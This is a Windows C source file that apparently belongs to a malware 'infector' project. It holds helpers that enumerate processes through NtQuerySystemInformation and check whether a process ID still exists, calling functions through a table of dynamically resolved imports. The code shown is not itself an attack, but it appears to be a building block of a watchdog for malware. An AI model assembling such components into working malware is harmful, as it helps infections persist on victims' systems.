#include <Windows.h>
#include <winternl.h>

#include "x86-watchdog-infector.h"

int
process_list(struct dll_imports* imports, PSYSTEM_PROCESS_INFORMATION* p_spi)
{
  ULONG length = 0;
  NTSTATUS status = 0;

  *p_spi = NULL;
  do {
    if (!NT_SUCCESS(status) && *p_spi != NULL) {
      imports->VirtualFree(*p_spi, 0, MEM_RELEASE);

      if (status != STATUS_INFO_LENGTH_MISMATCH) {
        return -1;
      }
    }

    if (length != 0) {
      *p_spi = imports->VirtualAlloc(
        NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

      if (*p_spi == NULL) {
        return -2;
      }
    }

    status = imports->NtQuerySystemInformation(
      SystemProcessInformation, *p_spi, length, &length);

  } while (!NT_SUCCESS(status));

  return 0;
}

int
process_exists(struct dll_imports* imports, ULONGLONG proc_id)
{
  int ret = 0;
  PSYSTEM_PROCESS_INFORMATION p_spi = NULL;

  if (process_list(imports, &p_spi) < 0) {
    return -1;
  }

  PVOID p_original_spi = p_spi;

  do {
    if (((ULONGLONG)p_spi->UniqueProcessId) == proc_id) {
      ret = 1;
      goto free_p_spi;
    }

    if (p_spi->NextEntryOffset == 0) {
      break;
    }

    p_spi =
      (PSYSTEM_PROCESS_INFORMATION)(((PBYTE)p_spi) + p_spi->NextEntryOffset);
  } while (1);

free_p_spi:
  imports->VirtualFree(p_original_spi, 0, MEM_RELEASE);

  return ret;
}
